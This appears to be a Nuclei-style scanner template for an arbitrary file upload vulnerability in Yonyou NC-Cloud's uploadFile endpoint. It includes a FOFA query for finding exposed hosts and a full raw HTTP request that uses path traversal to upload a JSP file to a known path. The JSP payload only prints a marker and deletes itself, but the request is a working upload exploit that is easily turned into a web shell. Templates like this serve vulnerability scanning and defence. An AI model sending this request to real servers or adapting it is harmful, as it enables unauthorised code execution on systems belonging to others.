info:
  name: 用友uploadFile 接口 任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/upo5ziqdlkdzwuo4'
  tags: file-upload,2024
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: upo5ziqdlkdzwuo4
    fofa: app="用友-NC-Cloud"
http:
- raw:
  - 'POST /mp/login/../uploadControl/uploadFile HTTP/1.1


    Connection: close


    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp


    Upgrade-Insecure-Requests: 1


    Accept-Encoding: gzip, deflate




    ------WebKitFormBoundaryoDIsCqVMmF83ptmp


    Content-Disposition: form-data; name="file"; filename="dudesite.jsp"


    Content-Type: application/octet-stream




    <%out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>


    ------WebKitFormBoundaryoDIsCqVMmF83ptmp


    Content-Disposition: form-data; name="submit"




    submit


    ------WebKitFormBoundaryoDIsCqVMmF83ptmp--


    # 响应代码特征

    200


    # 响应内容特征

    forbidden


    # 上传文件定位

    /mp/uploadFileDir/dudesite.jsp'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
